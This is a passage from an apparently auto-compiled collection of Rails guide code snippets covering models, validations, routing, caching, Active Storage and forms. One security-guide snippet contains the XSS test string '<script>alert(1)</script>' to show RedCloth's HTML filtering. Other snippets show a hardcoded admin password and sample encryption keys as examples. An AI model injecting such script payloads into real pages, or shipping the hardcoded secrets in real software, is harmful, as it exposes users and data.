ruby\nCODE:\n```\nclass Computer < ApplicationRecord\n  validates :mouse, presence: true,\n                    if: [Proc.new { |c| c.market.retail? }, :desktop?],\n                    unless: Proc.new { |c| c.trackpad.present? }\nend\n```\n\n----------------------------------------\n\nTITLE: Defining a GET Route in Rails\nDESCRIPTION: This Ruby code snippet defines a GET route in the `config/routes.rb` file. It maps GET requests to the `/products` path to the `index` action of the `ProductsController`. This route allows users to view a list of products.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_34\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.routes.draw do\n  get \"/products\", to: \"products#index\"\nend\n```\n\n----------------------------------------\n\nTITLE: Subset Condition with Array in Rails\nDESCRIPTION: This example shows how to find records where a specific attribute's value is within a given set of values using an array and the IN operator.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_68\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.where(orders_count: [1, 3, 5])\n```\n\n----------------------------------------\n\nTITLE: Using order with has_many Association in ActiveRecord\nDESCRIPTION: Shows how to use the order option with a has_many association to specify the order in which associated objects will be received, using SQL ORDER BY clause syntax.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_127\n\nLANGUAGE: ruby\nCODE:\n```\nclass Author < ApplicationRecord\n  has_many :books, -> { order \"date_confirmed DESC\" }\nend\n```\n\n----------------------------------------\n\nTITLE: Query Books with Multiple Conditions Using Array Conditions in Ruby\nDESCRIPTION: This snippet demonstrates using array conditions with multiple placeholders to query books based on title and availability. SQL injection is avoided by using placeholders.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_55\n\nLANGUAGE: ruby\nCODE:\n```\nBook.where(\"title = ? AND out_of_print = ?\", params[:title], false)\n```\n\n----------------------------------------\n\nTITLE: Rendering Product Names in View (ERB)\nDESCRIPTION: This code iterates through the `@products` collection in the `index.html.erb` view, rendering each product's name within a `div` element. It uses ERB tags to execute Ruby code within the HTML template.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_47\n\nLANGUAGE: erb\nCODE:\n```\n<h1>Products</h1>\n\n<div id=\"products\">\n  <% @products.each do |product| %>\n    <div>\n      <%= product.name %>\n    </div>\n  <% end %>\n</div>\n```\n\n----------------------------------------\n\nTITLE: RedCloth with HTML filtering option\nDESCRIPTION: A Ruby example showing how to use RedCloth's :filter_html option to prevent XSS attacks. This demonstrates the improved security when HTML filtering is enabled.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_53\n\nLANGUAGE: ruby\nCODE:\n```\nRedCloth.new(\"<script>alert(1)</script>\", [:filter_html]).to_html\n# => \"alert(1)\"\n```\n\n----------------------------------------\n\nTITLE: Swapping Middleware with config.middleware.swap - Ruby\nDESCRIPTION: This Ruby snippet demonstrates replacing (swapping) an existing middleware with a new one in the Rails middleware stack using config.middleware.swap. Typically used in config/application.rb, this example replaces ActionDispatch::ShowExceptions with Lifo::ShowExceptions. Requires that the classes for both middlewares exist and are loaded. The command changes the order and presence of middleware for all requests after the next server restart.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_on_rack.md#2025-04-23_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\n# config/application.rb\\n\\n# Replace ActionDispatch::ShowExceptions with Lifo::ShowExceptions\\nconfig.middleware.swap ActionDispatch::ShowExceptions, Lifo::ShowExceptions\n```\n\n----------------------------------------\n\nTITLE: Using select with belongs_to Association in ActiveRecord\nDESCRIPTION: Demonstrates how to use the select option with a belongs_to association, including setting the foreign_key option to ensure correct results when selecting specific columns.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_124\n\nLANGUAGE: ruby\nCODE:\n```\nclass Book < ApplicationRecord\n  belongs_to :author, -> { select(:id, :name) }, foreign_key: \"author_id\" # Only select id and name columns\nend\n\nclass Author < ApplicationRecord\n  has_many :books\nend\n```\n\n----------------------------------------\n\nTITLE: Rails Resource Route\nDESCRIPTION: Configures resource routing for books, which implicitly defines standard routes like index, show, new, edit, create, update, and destroy, mapping them to corresponding controller actions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\nresources :books\n```\n\n----------------------------------------\n\nTITLE: Adding a Rich Text Field to the Product Model - Ruby\nDESCRIPTION: This code adds a rich text field called 'description' to the Product model using Action Text.  It includes the `has_rich_text` association and validates the presence of the 'name' attribute.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_79\n\nLANGUAGE: ruby\nCODE:\n```\nclass Product < ApplicationRecord\n  has_rich_text :description\n  validates :name, presence: true\nend\n```\n\n----------------------------------------\n\nTITLE: Declaring Encrypted Attributes in Models\nDESCRIPTION: Example of declaring an encrypted attribute in an Active Record model class using the encrypts method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_encryption.md#2025-04-23_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\nclass Article < ApplicationRecord\n  encrypts :title\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Asset Precompilation for Engine-specific Assets\nDESCRIPTION: Shows how to set up an initializer that adds engine-specific assets to the precompilation list. This is useful for assets that are only needed by the engine itself and not required by the host application.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_63\n\nLANGUAGE: ruby\nCODE:\n```\ninitializer \"blorgh.assets.precompile\" do |app|\n  app.config.assets.precompile += %w( admin.js admin.css )\nend\n```\n\n----------------------------------------\n\nTITLE: Setting HTTP Status Code in Rails Rendering\nDESCRIPTION: This snippet demonstrates how to set the HTTP status code of the response when rendering in Rails. The `:status` option allows you to specify either a numeric code or a symbol representing the status.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_22\n\nLANGUAGE: ruby\nCODE:\n```\nrender status: 500\n```\n\nLANGUAGE: ruby\nCODE:\n```\nrender status: :forbidden\n```\n\n----------------------------------------\n\nTITLE: Using the Uniqueness Validator with Case Sensitivity Option (Ruby)\nDESCRIPTION: Shows how to use the `:case_sensitive` option with the `uniqueness` validator in a `Person` model. Setting it to `false` makes the uniqueness check case-insensitive. Note that the actual behavior might depend on the database collation.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_35\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\n  validates :name, uniqueness: { case_sensitive: false }\nend\n```\n\n----------------------------------------\n\nTITLE: Custom Form Builder Class in Rails\nDESCRIPTION: This code snippet demonstrates how to create a custom form builder class in Rails to add custom form elements. It subclasses `ActionView::Helpers::FormBuilder` and overrides the `text_field` method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_64\n\nLANGUAGE: ruby\nCODE:\n```\nclass LabellingFormBuilder < ActionView::Helpers::FormBuilder\n  def text_field(attribute, options = {})\n    # super will call the original text_field method\n    label(attribute) + super\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Basic Validation and Error Handling in Rails\nDESCRIPTION: This snippet shows how to define basic validations and check errors. It demonstrates validating name presence and length, then accessing error messages through the errors collection.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_62\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\n  validates :name, presence: true, length: { minimum: 3 }\nend\n```\n\n----------------------------------------\n\nTITLE: Using validation callbacks in Rails\nDESCRIPTION: This code snippet showcases the usage of `before_validation` and `after_validation` callbacks. The `titleize_name` callback converts the `name` attribute to title case before validation, and the `log_errors` callback logs any validation errors after validation.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  validates :name, presence: true\n  before_validation :titleize_name\n  after_validation :log_errors\n\n  private\n    def titleize_name\n      self.name = name.downcase.titleize if name.present?\n      Rails.logger.info(\"Name titleized to #{name}\")\n    end\n\n    def log_errors\n      if errors.any?\n        Rails.logger.error(\"Validation failed: #{errors.full_messages.join(', ')}\")\n      end\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Using validates_associated in a Rails Model (Ruby)\nDESCRIPTION: Demonstrates the `validates_associated` helper in a `Library` model with a `has_many :books` association. This ensures that whenever a `Library` object is validated, the `valid?` method is also called on each associated `Book` object. It requires ActiveRecord objects.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_37\n\nLANGUAGE: ruby\nCODE:\n```\nclass Library < ApplicationRecord\n  has_many :books\n  validates_associated :books\nend\n```\n\n----------------------------------------\n\nTITLE: Validating Attribute Inclusion in a Static Set in Rails (Ruby)\nDESCRIPTION: Utilizes the `inclusion` validator in a `Coffee` model to ensure the `size` attribute's value is present within a predefined array `['small', 'medium', 'large']`. The `:in` option specifies the set of allowed values, and a custom error message is included.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_20\n\nLANGUAGE: ruby\nCODE:\n```\nclass Coffee < ApplicationRecord\n  validates :size, inclusion: { in: %w(small medium large),\n    message: \"%\\{value} is not a valid size\" }\nend\n```\n\n----------------------------------------\n\nTITLE: Creating Enumerated Types in PostgreSQL with Rails\nDESCRIPTION: Shows how to implement PostgreSQL enum types in Rails, including creating, modifying, and using enum values in models.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_postgresql.md#2025-04-23_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\n# db/migrate/20131220144913_create_articles.rb\ndef change\n  create_enum :article_status, [\"draft\", \"published\", \"archived\"]\n\n  create_table :articles do |t|\n    t.enum :status, enum_type: :article_status, default: \"draft\", null: false\n  end\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# app/models/article.rb\nclass Article < ApplicationRecord\n  enum :status, {\n    draft: \"draft\", published: \"published\", archived: \"archived\"\n  }, prefix: true\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Action Mailbox Inbound Email Incineration\nDESCRIPTION: Demonstrates how to configure the time duration after which `ActionMailbox::InboundEmail` records are destroyed after processing. This helps manage storage space by automatically removing old email records. The example sets the incineration period to 14 days.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_57\n\nLANGUAGE: ruby\nCODE:\n```\n# Incinerate inbound emails 14 days after processing.\nconfig.action_mailbox.incinerate_after = 14.days\n```\n\n----------------------------------------\n\nTITLE: Configure Production RedisCacheStore\nDESCRIPTION: This snippet shows a more complex configuration for a production RedisCacheStore, including multiple server URLs, timeouts, reconnection attempts, and an error handler. The error handler reports exceptions to Sentry as warnings.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_43\n\nLANGUAGE: ruby\nCODE:\n```\ncache_servers = %w(redis://cache-01:6379/0 redis://cache-02:6379/0)\nconfig.cache_store = :redis_cache_store, { url: cache_servers,\n\n  connect_timeout:    30,  # Defaults to 1 second\n  read_timeout:       0.2, # Defaults to 1 second\n  write_timeout:      0.2, # Defaults to 1 second\n  reconnect_attempts: 2,   # Defaults to 1\n\n  error_handler: -> (method:, returning:, exception:) {\n    # Report errors to Sentry as warnings\n    Sentry.capture_exception exception, level: \"warning\",\n      tags: { method: method, returning: returning }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Custom Database Warning Handling in Ruby\nDESCRIPTION: This example demonstrates how to configure a custom action to be taken when a database warning is produced. A lambda is assigned to `config.active_record.db_warnings_action`, which takes a `SQLWarning` object as input. Inside the lambda, the warning's message and other metadata (code and level) are reported to a custom exception reporting service (e.g., Bugsnag). This allows for centralized monitoring and handling of database warnings.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_36\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_record.db_warnings_action = ->(warning) do\n  # Report to custom exception reporting service\n  Bugsnag.notify(warning.message) do |notification|\n    notification.add_metadata(:warning_code, warning.code)\n    notification.add_metadata(:warning_level, warning.level)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Rendering a Different View with Symbol\nDESCRIPTION: Same functionality as the previous example, but uses a symbol (`:edit`) instead of a string to specify the view to render. Also adds a status code for unprocessable entity.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\ndef update\n  @book = Book.find(params[:id])\n  if @book.update(book_params)\n    redirect_to(@book)\n  else\n    render :edit, status: :unprocessable_entity\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring File Store with Path\nDESCRIPTION: This snippet configures the FileStore, specifying the directory where cache files will be stored.  The first argument is the symbol `:file_store`, and the second is the path to the directory.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_38\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.cache_store = :file_store, \"/path/to/cache/directory\"\n```\n\n----------------------------------------\n\nTITLE: Customizing Active Model Error full_message Format\nDESCRIPTION: Demonstrates overriding the default format for `Error#full_message` in Active Model using i18n locale files. The example overrides the format for all `Person` attributes and for the specific `age` attribute.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_30\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person\n  include ActiveModel::Validations\n\n  attr_accessor :name, :age\n\n  validates :name, :age, presence: true\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Routes with Locale Scope in Ruby on Rails\nDESCRIPTION: Sets up routes with a locale scope, allowing URLs to include the locale. This example shows both mandatory and optional locale parameters in the routes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\n# config/routes.rb\nscope \"/:locale\" do\n  resources :books\nend\n\n# Optional locale\nscope \"(:locale)\", locale: /en|nl/ do\n  resources :books\nend\n\n# Handling root URL with locale\nget \"/:locale\" => \"dashboard#index\"\n```\n\n----------------------------------------\n\nTITLE: Add Column with Index Migration (Ruby)\nDESCRIPTION: This migration adds a 'part_number' column of type string to the 'products' table and creates an index on it using 'add_column' and 'add_index'.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\nclass AddPartNumberToProducts < ActiveRecord::Migration[8.1]\n  def change\n    add_column :products, :part_number, :string\n    add_index :products, :part_number\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring strict_loading! with N+1 Only Mode in Rails\nDESCRIPTION: Shows how to use `strict_loading!` with the `:n_plus_one_only` mode. This allows certain lazy loading but raises an error when an association leads to an N+1 query.  This can be useful to identify specific performance bottlenecks.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_159\n\nLANGUAGE: ruby\nCODE:\n```\nuser.strict_loading!(mode: :n_plus_one_only)\nuser.address.city # => \"Tatooine\"\nuser.comments.to_a # => [#<Comment:0x00...>]\nuser.comments.first.likes.to_a # raises an ActiveRecord::StrictLoadingViolationError\n```\n\n----------------------------------------\n\nTITLE: Configuring Capybara for Remote Servers (Ruby)\nDESCRIPTION: This Ruby snippet configures Capybara to work with remote servers, often necessary when the application is running in a Docker container. It binds the Capybara server to all interfaces (0.0.0.0) and sets the `app_host` to the machine's IP address if the `SELENIUM_REMOTE_URL` environment variable is present. Requires socket and ipaddr gems.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_65\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"test_helper\"\n\nclass ApplicationSystemTestCase < ActionDispatch::SystemTestCase\n  setup do\n      Capybara.server_host = \"0.0.0.0\" # bind to all interfaces\n      Capybara.app_host = \"http://#{IPSocket.getaddress(Socket.gethostname)}\" if ENV[\"SELENIUM_REMOTE_URL\"].present?\n    end\n  # ...\nend\n```\n\n----------------------------------------\n\nTITLE: Counting records with count in Rails\nDESCRIPTION: Demonstrates how to use `count` to determine the number of records in a model's table or based on specific conditions defined in a relation.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_203\n\nLANGUAGE: irb\nCODE:\n```\nirb> Customer.count\nSELECT COUNT(*) FROM customers\n```\n\nLANGUAGE: irb\nCODE:\n```\nirb> Customer.where(first_name: 'Ryan').count\nSELECT COUNT(*) FROM customers WHERE (first_name = 'Ryan')\n```\n\nLANGUAGE: irb\nCODE:\n```\nirb> Customer.includes(\"orders\").where(first_name: 'Ryan', orders: { status: 'shipped' }).count\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT COUNT(DISTINCT customers.id) FROM customers\n  LEFT OUTER JOIN orders ON orders.customer_id = customers.id\n  WHERE (customers.first_name = 'Ryan' AND orders.status = 0)\n```\n\n----------------------------------------\n\nTITLE: Strong Parameters - Nested Parameters\nDESCRIPTION: Shows how to use `expect` (or `permit`) on nested parameters to whitelist complex data structures.  Provides an example of how to handle nested hashes and arrays of hashes in parameter filtering.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\n# Given the example expected params:\nparams = ActionController::Parameters.new(\n  name: \"Martin\",\n  emails: [\"me@example.com\"],\n  friends: [\n    { name: \"André\", family: { name: \"RubyGems\" }, hobbies: [\"keyboards\", \"card games\"] },\n    { name: \"Kewe\", family: { name: \"Baroness\" }, hobbies: [\"video games\"] },\n  ]\n)\n```\n\n----------------------------------------\n\nTITLE: Configuring Primary Key Rotation for Active Record Encryption - YAML\nDESCRIPTION: An example YAML configuration for setting up multiple data-encryption keys for Active Record Encryption key rotation in Rails. The primary_key array allows for sequential key usage, with the last key used for new encryption and others for decryption. Also includes the key_derivation_salt, which must be kept secret. The YAML block should be placed in a Rails config file (such as config/credentials.yml.enc or an initializer) as part of environment settings.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_encryption.md#2025-04-23_snippet_13\n\nLANGUAGE: yml\nCODE:\n```\nactive_record_encryption:\n  primary_key:\n    - a1cc4d7b9f420e40a337b9e68c5ecec6 # Previous keys can still decrypt existing content\n    - bc17e7b413fd4720716a7633027f8cc4 # Active, encrypts new content\n  key_derivation_salt: a3226b97b3b2f8372d1fc6d497a0c0d3\n```\n\n----------------------------------------\n\nTITLE: HTTP Digest Authentication in Rails Controller\nDESCRIPTION: Implementation of HTTP Digest Authentication in a Rails controller using authenticate_or_request_with_http_digest method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_advanced_topics.md#2025-04-23_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\nclass AdminsController < ApplicationController\n  USERS = { \"admin\" => \"helloworld\" }\n\n  before_action :authenticate\n\n  private\n    def authenticate\n      authenticate_or_request_with_http_digest do |username|\n        USERS[username]\n      end\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Validating Inventory Count (Rails Model)\nDESCRIPTION: This code snippet adds a validation to the Product model to ensure that the inventory count is never a negative number. It uses the `validates` method with the `numericality` option.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_98\n\nLANGUAGE: ruby\nCODE:\n```\nclass Product < ApplicationRecord\n  has_one_attached :featured_image\n  has_rich_text :description\n\n  validates :name, presence: true\n  validates :inventory_count, numericality: { greater_than_or_equal_to: 0 }\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Active Storage Binary Content Types in Ruby\nDESCRIPTION: This snippet configures the content types that Active Storage will serve as attachments, rather than inline. It sets the `config.active_storage.content_types_to_serve_as_binary` to an array of content types that should always be served as attachments. This ensures that certain file types are downloaded instead of displayed in the browser.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_75\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_storage.content_types_to_serve_as_binary = %w(text/html image/svg+xml application/postscript application/x-shockwave-flash text/xml application/xml application/xhtml+xml application/mathml+xml text/cache-manifest)\n```\n\n----------------------------------------\n\nTITLE: Configuring Engine Routes in Ruby\nDESCRIPTION: Shows how to define isolated routes within a Rails engine using the Engine.routes.draw configuration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_60\n\nLANGUAGE: ruby\nCODE:\n```\nBlorgh::Engine.routes.draw do\n  resources :articles\nend\n```\n\n----------------------------------------\n\nTITLE: Deleting Middleware with config.middleware.delete - Ruby\nDESCRIPTION: This Ruby snippet shows how to remove a middleware, such as Rack::Runtime, from the Rails middleware stack by calling config.middleware.delete in config/application.rb. It affects all incoming requests after server restart. Attempting to delete a non-existent middleware will fail silently unless delete! is used. No additional dependencies other than the application configuration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_on_rack.md#2025-04-23_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\n# config/application.rb\\nconfig.middleware.delete Rack::Runtime\n```\n\n----------------------------------------\n\nTITLE: Ruby Model Definitions for City and Person\nDESCRIPTION: These Ruby code snippets define two ActiveRecord models: `City` and `Person`. The `Person` model has a `belongs_to` association with the `City` model, establishing a foreign key relationship.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_48\n\nLANGUAGE: ruby\nCODE:\n```\nclass City < ApplicationRecord\nend\n\nclass Person < ApplicationRecord\n  belongs_to :city\nend\n```\n\n----------------------------------------\n\nTITLE: Formatting Numbers with Delimiters using number_with_delimiter in Ruby\nDESCRIPTION: Demonstrates the use of number_with_delimiter helper to format a number with grouped thousands using a delimiter.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\nnumber_with_delimiter(12345678) # => 12,345,678\n```\n\n----------------------------------------\n\nTITLE: Generic Search Form - ERB\nDESCRIPTION: This snippet shows how to create a basic search form using `form_with` in ERB.  It specifies the URL to which the form data will be submitted and sets the HTTP method to GET. It also uses the form builder to generate a label, a search field, and a submit button.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_2\n\nLANGUAGE: erb\nCODE:\n```\n<%= form_with url: \"/search\", method: :get do |form| %>\n  <%= form.label :query, \"Search for:\" %>\n  <%= form.search_field :query %>\n  <%= form.submit \"Search\" %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Deleting Records Directly without Callbacks/Validations in Ruby\nDESCRIPTION: Shows how to delete records directly from the database, bypassing Active Record callbacks and validations for faster bulk deletion. `find_by(...).delete` deletes a single found record, while `delete_all` removes all records from the table by executing a direct SQL DELETE statement.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_basics.md#2025-04-23_snippet_19\n\nLANGUAGE: ruby\nCODE:\n```\nBook.find_by(title: \"The Lord of the Rings\").delete\nBook.delete_all\n```\n\n----------------------------------------\n\nTITLE: Implementing Direct Upload Progress Indicators in JavaScript\nDESCRIPTION: This snippet demonstrates how to use event listeners to show the progress of direct file uploads. It creates HTML elements to display upload status and progress bars for each file.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_70\n\nLANGUAGE: javascript\nCODE:\n```\naddEventListener(\"direct-upload:initialize\", event => {\n  const { target, detail } = event\n  const { id, file } = detail\n  target.insertAdjacentHTML(\"beforebegin\", `\n    <div id=\"direct-upload-${id}\" class=\"direct-upload direct-upload--pending\">\n      <div id=\"direct-upload-progress-${id}\" class=\"direct-upload__progress\" style=\"width: 0%\"></div>\n      <span class=\"direct-upload__filename\"></span>\n    </div>\n  `)\n  target.previousElementSibling.querySelector(`.direct-upload__filename`).textContent = file.name\n})\n\naddEventListener(\"direct-upload:start\", event => {\n  const { id } = event.detail\n  const element = document.getElementById(`direct-upload-${id}`)\n  element.classList.remove(\"direct-upload--pending\")\n})\n\naddEventListener(\"direct-upload:progress\", event => {\n  const { id, progress } = event.detail\n  const progressElement = document.getElementById(`direct-upload-progress-${id}`)\n  progressElement.style.width = `${progress}%`\n})\n\naddEventListener(\"direct-upload:error\", event => {\n  event.preventDefault()\n  const { id, error } = event.detail\n  const element = document.getElementById(`direct-upload-${id}`)\n  element.classList.add(\"direct-upload--error\")\n  element.setAttribute(\"title\", error)\n})\n\naddEventListener(\"direct-upload:end\", event => {\n  const { id } = event.detail\n  const element = document.getElementById(`direct-upload-${id}`)\n  element.classList.add(\"direct-upload--complete\")\n})\n```\n\n----------------------------------------\n\nTITLE: Strong Parameters - Expect Method\nDESCRIPTION: Demonstrates the `expect` method for requiring and permitting parameters in Rails. Shows how to ensure a root key is present and attributes are permitted, raising an error if the key is not a nested hash with the specified keys.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\nid = params.expect(:id)\n```\n\nLANGUAGE: ruby\nCODE:\n```\nuser_params = params.expect(user: [:username, :password])\nuser_params.has_key?(:username) # => true\n```\n\nLANGUAGE: ruby\nCODE:\n```\nparams.expect(log_entry: {})\n```\n\n----------------------------------------\n\nTITLE: Using allow_nil Option for Conditional Validation in Rails\nDESCRIPTION: This snippet demonstrates the allow_nil option which skips validation when the attribute value is nil. The Coffee model validates that size must be one of the specified values unless it's nil.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_44\n\nLANGUAGE: ruby\nCODE:\n```\nclass Coffee < ApplicationRecord\n  validates :size, inclusion: { in: %w(small medium large),\n    message: \"%{value} is not a valid size\" }, allow_nil: true\nend\n```\n\n----------------------------------------\n\nTITLE: Setting the priority for ActiveJob\nDESCRIPTION: This snippet shows how to schedule a job to run with a specific priority using `queue_with_priority` within an ActiveJob class. Lower numbers are generally treated as more important.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_29\n\nLANGUAGE: ruby\nCODE:\n```\nclass GuestsCleanupJob < ApplicationJob\n  queue_with_priority 10\n  # ...\nend\n```\n\n----------------------------------------\n\nTITLE: Distinct Values Selection in Rails\nDESCRIPTION: Demonstrates how to use the `distinct` method to retrieve only unique values for a specified column.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_86\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.select(:last_name).distinct\n```\n\n----------------------------------------\n\nTITLE: Using Custom Form Builder in ERB\nDESCRIPTION: This code snippet shows how to use the custom form builder class `LabellingFormBuilder` in an ERB template. It specifies the `builder` option in `form_with`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_65\n\nLANGUAGE: erb\nCODE:\n```\n<%= form_with model: @person, builder: LabellingFormBuilder do |form| %>\n  <%= form.text_field :first_name %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Generating Migration with belongs_to (Shell)\nDESCRIPTION: This command generates a migration to add a foreign key reference to the `products` table using `belongs_to` as an alias for `references`, linking it to the `users` table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_17\n\nLANGUAGE: Shell\nCODE:\n```\n$ bin/rails generate migration AddUserRefToProducts user:belongs_to\n```\n\n----------------------------------------\n\nTITLE: Configuring Allowed Hosts in Development Environment\nDESCRIPTION: This Ruby code snippet shows how to configure allowed hosts in the development environment using the new config.hosts setting in Rails 6.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_34\n\nLANGUAGE: ruby\nCODE:\n```\n# config/environments/development.rb\n\nconfig.hosts << \"dev.myapp.com\"\nconfig.hosts << /[a-z0-9-]+\\.myapp\\.com/ # Optionally, regexp is allowed as well\n```\n\n----------------------------------------\n\nTITLE: Configuring Validator with Custom Options in Ruby on Rails\nDESCRIPTION: This code demonstrates how to pass custom options to a validator class. The AddressValidator receives a fields array and validates that each specified field is not blank.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_42\n\nLANGUAGE: ruby\nCODE:\n```\nclass AddressValidator < ActiveModel::Validator\n  def validate(record)\n    options[:fields].each do |field|\n      if record.send(field).blank?\n        record.errors.add field, \"is required\"\n      end\n    end\n  end\nend\n\nclass Invoice < ApplicationRecord\n  validates_with AddressValidator, fields: [:house_number, :street, :postcode, :country]\nend\n```\n\n----------------------------------------\n\nTITLE: Handling User Signup and Attachment in Rails Controller (Ruby)\nDESCRIPTION: Sample controller action showing signup logic that creates a user, sets session, and redirects. Includes a strong parameters method. Illustrates that avatar file upload is included in user_params and assumed to be processed by has_one_attached. Depends on strong parameters and a form view accepting avatar uploads.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_16\n\nLANGUAGE: ruby\nCODE:\n```\nclass SignupController < ApplicationController\n  def create\n    user = User.create!(user_params)\n    session[:user_id] = user.id\n    redirect_to root_path\n  end\n\n  private\n    def user_params\n      params.expect(user: [:email_address, :password, :avatar])\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Defining a simple Active Job\nDESCRIPTION: This snippet shows a basic Active Job class definition. It inherits from `ApplicationJob`, specifies the queue it runs on as 'default', and defines a `perform` method where the job's logic resides. The `perform` method accepts any number of arguments.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\nclass GuestsCleanupJob < ApplicationJob\n  queue_as :default\n\n  def perform(*guests)\n    # Do something later\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Custom Form Helper in Rails\nDESCRIPTION: This code snippet demonstrates how to create a custom form helper in Rails to display a text field along with a label. It defines a method `text_field_with_label` in 